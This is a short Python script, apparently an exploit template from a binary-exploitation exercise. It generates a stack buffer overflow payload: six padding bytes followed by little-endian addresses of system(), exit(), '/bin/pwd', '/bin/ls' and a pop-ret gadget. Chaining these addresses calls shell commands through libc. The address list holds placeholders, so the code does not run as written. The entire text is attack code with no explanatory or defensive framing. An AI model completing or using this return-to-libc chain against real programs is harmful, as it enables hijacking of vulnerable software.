def adjust_addr(addr):
	return "".join(
		['\\x' + addr[i:i+2] for i in range(6,-1,-2)]
		)

addrs = [
		# Find addresses with gdb, internally use 'p NAME_OF_FUNCTION'
		.,	# /bin/pwd
		.,	# exit()
		.,	# system()
		.,	# /bin/ls
		.,	# popret
		.	# system()
	]

if __name__ == '__main__':
	# 6 = buffer size (2) + 4
	print('A' * 6 + "".join(
		[adjust_addr(a) for a in addrs[::-1]]
		))